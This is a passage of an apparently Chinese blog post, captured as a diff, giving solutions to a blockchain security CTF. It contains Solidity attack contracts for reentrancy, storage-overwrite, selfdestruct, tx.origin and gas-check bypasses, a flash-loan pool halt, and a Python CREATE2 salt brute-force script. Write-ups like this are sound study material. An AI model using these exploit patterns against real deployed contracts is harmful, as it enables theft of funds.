00000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b60208310610d525780518252602082019150602081019050602083039250610d2f565b6001836020036101000a03801982511681845116808217855250505050505090500191505060006040518083038185875af1925050503d8060008114610db4576040519150601f19603f3d011682016040523d82523d6000602084013e610db9565b606091505b50505050565b8073ffffffffffffffffffffffffffffffffffffffff1660c8604051602401808281526020019150506040516020818303038152906040527fe4849b32000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b60208310610e985780518252602082019150602081019050602083039250610e75565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d8060008114610efa576040519150601f19603f3d011682016040523d82523d6000602084013e610eff565b606091505b5050505056fea26469706673582212204d057579c349cdfe3e7b6a0517f38117ca61899b79261b0c49d20aba97e3aae664736f6c634300060c0033&quot;;</span><br><span class="line"> </span><br><span class="line">    function deploy(bytes32 salt) public &#123;</span><br><span class="line">        bytes memory bytecode &#x3D; contractBytecode;</span><br><span class="line">        address addr;</span><br><span class="line">        assembly &#123;</span><br><span class="line">          addr :&#x3D; create2(0, add(bytecode, 0x20), mload(bytecode), salt)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>攻击合约</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.6.12;</span><br><span class="line">contract test &#123;</span><br><span class="line">    constructor() public payable&#123;&#125;</span><br><span class="line">    bool nice &#x3D; true;</span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        if(nice)&#123;</span><br><span class="line">            msg.sender.call(</span><br><span class="line">                abi.encodeWithSignature(&quot;sell(uint256)&quot;,200)</span><br><span class="line">            );</span><br><span class="line">            nice &#x3D; false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function isOwner(address _owner) view public returns(bool)&#123;</span><br><span class="line">        uint gas1 &#x3D; gasleft();</span><br><span class="line">        if(gas1 &#x3D;&#x3D; 0x49e797c)&#123;&#x2F;&#x2F;浏览器调试</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    function _change(address target) public returns (bool success, bytes memory data)&#123;</span><br><span class="line">        (bool success, bytes memory data)  &#x3D; target.call(</span><br><span class="line">            abi.encodeWithSignature(&quot;change(address)&quot;,address(this))</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function change_own(address target) public &#123;</span><br><span class="line">        (bool success, bytes memory data)  &#x3D; target.call(</span><br><span class="line">            abi.encodeWithSignature(&quot;change_Owner()&quot;)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function buy_func(address target) public payable&#123;</span><br><span class="line">        target.call&#123;value: 1&#125;(</span><br><span class="line">            abi.encodeWithSignature(&quot;buy()&quot;)</span><br><span class="line">        );</span><br><span class="line">        &#x2F;&#x2F; check return value</span><br><span class="line">    &#125;</span><br><span class="line">    function for_flag(address target,string memory b64email) public &#123;</span><br><span class="line">        target.call(</span><br><span class="line">            abi.encodeWithSignature(&quot;payforflag(string)&quot;, b64email)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function get_enough_money(address target) public&#123;</span><br><span class="line">        target.call(</span><br><span class="line">            abi.encodeWithSignature(&quot;transfer(address,uint256)&quot;, address(this),100)</span><br><span class="line">        );</span><br><span class="line">        target.call(</span><br><span class="line">            abi.encodeWithSignature(&quot;transfer(address,uint256)&quot;, address(this),200)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    function get_correct_time(address target) public&#123;</span><br><span class="line">        target.call(</span><br><span class="line">            abi.encodeWithSignature(&quot;sell(uint256)&quot;,200)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="赛题五"><a href="#赛题五" class="headerlink" title="赛题五"></a>赛题五</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">fallback() external &#123;</span><br><span class="line">        if(map.length&gt;&#x3D;uint256(msg.sender))&#123;</span><br><span class="line">            require(map[uint256(msg.sender)]!&#x3D;1);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        if(token.balanceOf(address(this))&#x3D;&#x3D;0)&#123;</span><br><span class="line">            &#x2F;&#x2F;airdrop is over</span><br><span class="line">            selfdestruct(msg.sender);&#x2F;&#x2F;空投结束，触发自毁</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            token.safeTransfer(msg.sender,100); &#x2F;&#x2F;转账100token</span><br><span class="line">            </span><br><span class="line">            if (map.length &lt;&#x3D; uint256(msg.sender)) &#123;</span><br><span class="line">                increaseMapLength(uint256(msg.sender) + 1);</span><br><span class="line">            &#125;</span><br><span class="line">            map[uint256(msg.sender)] &#x3D; 1;  </span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function increaseMapLength(uint256 len) internal &#123;</span><br><span class="line">        assembly&#123;</span><br><span class="line">            sstore(0x01, len) &#x2F;&#x2F;开辟空间</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;Guess the value(param:x) of the keccak256 value modulo 10000 of the future block (param:blockNum)</span><br><span class="line">    function guess(uint256 x,uint256 blockNum) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 0.001 ether || token.allowance(msg.sender,address(this))&gt;&#x3D;1*(10**18));</span><br><span class="line">				&#x2F;&#x2F; guess要花费0.001 ether</span><br><span class="line">        require(blockNum&gt;block.number);&#x2F;&#x2F; blockNum要大于当前block.number</span><br><span class="line">        if(token.allowance(msg.sender,address(this))&gt;0)&#123;</span><br><span class="line">            token.safeTransferFrom(msg.sender,address(this),1*(10**18)); &#x2F;&#x2F;转账</span><br><span class="line">        &#125;</span><br><span class="line">        if (map.length &lt;&#x3D; uint256(msg.sender)+x) &#123;</span><br><span class="line">            increaseMapLength(uint256(msg.sender)+x + 1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        map[uint256(msg.sender)+x] &#x3D; blockNum; &#x2F;&#x2F; 可以实现任意位置写入blocknum</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;Run a lottery</span><br><span class="line">    function lottery(uint256 x) public &#123;</span><br><span class="line">        require(map[uint256(msg.sender)+x]!&#x3D;0);&#x2F;&#x2F; 目标地址必须有值</span><br><span class="line">        require(block.number &gt; map[uint256(msg.sender)+x]);&#x2F;&#x2F; 目标地址值大于当前区块值才能开奖</span><br><span class="line">        require(blockhash(map[uint256(msg.sender)+x])!&#x3D;0);&#x2F;&#x2F; 不能使中间的参数为当前块为0</span><br><span class="line">        </span><br><span class="line">        bytes memory hash &#x3D; abi.encode(blockhash(map[uint256(msg.sender)+x]));</span><br><span class="line">        uint256 answer &#x3D; uint256(keccak256(hash))%10000;</span><br><span class="line">        &#x2F;&#x2F; 计算hash的后4位</span><br><span class="line">        if (x &#x3D;&#x3D; answer) &#123;</span><br><span class="line">            token.safeTransfer(msg.sender,token.balanceOf(address(this)));</span><br><span class="line">            selfdestruct(msg.sender);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/10/22/30/image-20211023204306611.png" alt="image-20211023204306611"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">contract dvp_attack &#123;</span><br><span class="line">    address public targetaddr;</span><br><span class="line">		function fallback() public  payable &#123;&#125;&#x2F;&#x2F;接受自毁的ether</span><br><span class="line">    constructor(address addr) public payable &#123;</span><br><span class="line">        targetaddr &#x3D; addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address addr) public returns(uint i)&#123;</span><br><span class="line">        i &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(uint256 x,uint256 blockNum) public &#123;</span><br><span class="line">        DVPgame gim&#x3D; DVPgame(targetaddr);&#x2F;&#x2F;实例化</span><br><span class="line">        gim.guess.value(0.001 ether)(&#123;x:x,blockNum:blockNum&#125;);&#x2F;&#x2F;调用guess任意地址写入</span><br><span class="line">        targetaddr.call(abi.encode(bytes4(keccak256(&quot;a()&quot;))));&#x2F;&#x2F;调用fallback函数</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/10/22/30/image-20211023204540146.png" alt="image-20211023204540146"></p>
+<p>此时我们的x距离token位置偏出了c8c38cf8ac456ee7e0bc5e218f7ece57e53fb38d，把上次的x减去这个值，就是正确的token位置，再次attack 触发selfdestruct</p>
+<p><img src="/2021/10/22/30/image-20211023204601673.png" alt="image-20211023204601673"></p>
+<h1 id="赛题六"><a href="#赛题六" class="headerlink" title="赛题六"></a>赛题六</h1><p>题目说UnstoppableLender，所以就是要让它停下来。</p>
+<p>题目中的poolBalance由deposit累加，但是可以直接通过token.transfer，来打破balanceBefore和poolBalance的同步功能。</p>
+<p><img src="/2021/10/22/30/image-20211023204454937.png" alt="image-20211023204454937"></p>
+<p><img src="/2021/10/22/30/image-20211023204640686.png" alt="image-20211023204640686"></p>
+<h1 id="赛题七"><a href="#赛题七" class="headerlink" title="赛题七"></a>赛题七</h1><p>题目设置分别要通过三个考验</p>
+<ol>
+<li>密码公开可读取</li>
+<li>tx.origin钓鱼 gas限制绕过</li>
+<li>调用callfunction函数绕过</li>
+</ol>
+<p>通过浏览器读取密码</p>
+<p><img src="/2021/10/22/30/image-20211023204926238.png" alt="image-20211023204926238"></p>
+<p>部署攻击合约并且调试gas</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">contract att1&#123;</span><br><span class="line"></span><br><span class="line">    constructor() public&#123;</span><br><span class="line">        CrossGates gim &#x3D; CrossGates( CrossGates address);</span><br><span class="line">        gim.gateOne();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/10/22/30/image-20211023205159002.png" alt="image-20211023205159002"></p>
+<p><img src="/2021/10/22/30/image-20211023205111292.png" alt="image-20211023205111292"></p>
+<h1 id="赛题八"><a href="#赛题八" class="headerlink" title="赛题八"></a>赛题八</h1><p>transfer函数未做from，to判断，导致可以找我转账任意铸币。这个很简单先领取空投，然后翻倍十三次金额，就能达到题目要求</p>
+<p><img src="/2021/10/22/30/image-20211023205508672.png" alt="image-20211023205508672"></p>
+<h1 id="赛题九"><a href="#赛题九" class="headerlink" title="赛题九"></a>赛题九</h1><p>三个点</p>
+<ul>
+<li>extcodesize绕过</li>
+<li>delegatecall字节码绕过</li>
+<li>salt爆破</li>
+</ul>
+<p>预编译指令 0x0000000000000000000000000000000000000002绕过</p>
+<p>构造emit ForFlag(msg.sender);字节码</p>
+<p>爆破脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sha3</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">s1 = <span class="string">&#x27;0xff&#x27;</span>+ msg.sender</span><br><span class="line">s3 = <span class="string">&#x27;f14110c630e2e9cbd2e1fbe32823fa40f14535e40f0291373fb44d873d550825&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    tmp = <span class="built_in">hex</span>(i)[<span class="number">2</span>:].ljust(<span class="number">64</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    salt = Web3.sha3(hexstr=(tmp+<span class="string">&quot;msg.sender&quot;</span>.lower()))</span><br><span class="line">    sa = <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;%02x&#x27;</span> % b <span class="keyword">for</span> b <span class="keyword">in</span> salt])</span><br><span class="line">    s = s1+sa+s3</span><br><span class="line">    hashed = Web3.sha3(hexstr=s)</span><br><span class="line">    hashed_str = <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;%02x&#x27;</span> % b <span class="keyword">for</span> b <span class="keyword">in</span> hashed])</span><br><span class="line">    <span class="keyword">if</span> hashed_str[<span class="number">24</span>:].startswith(<span class="string">&quot;0000&quot;</span>):</span><br><span class="line">        print(tmp,hashed_str[<span class="number">24</span>:])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2021/10/22/30/image-20211023210439745.png" alt="image-20211023210439745"></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Zpano
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://zpano.cn/2021/10/22/30/" title="首届可信链区块链安全攻防大赛Solidity合约全解">https://zpano.cn/2021/10/22/30/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/" rel="tag"># 区块链安全</a>
+              <a href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/" rel="tag"># 智能合约安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/10/16/29/" rel="prev" title="Etherhack Writeup">
+                  <i class="fa fa-chevron-left"></i> Etherhack Writeup
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+      
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+      
+
+      
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Zpano</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">190k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">2:53</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+
+
+  
+
+  
+      <script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              const target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    const script = document.createElement('script');
+    script.src = '//cdn.jsdelivr.net/npm/mathjax@3.1.2/es5/tex-mml-chtml.js';
+    script.defer = true;
+    document.head.appendChild(script);
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.typesetClear();
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
+
+  
+
+</body>
+</html>
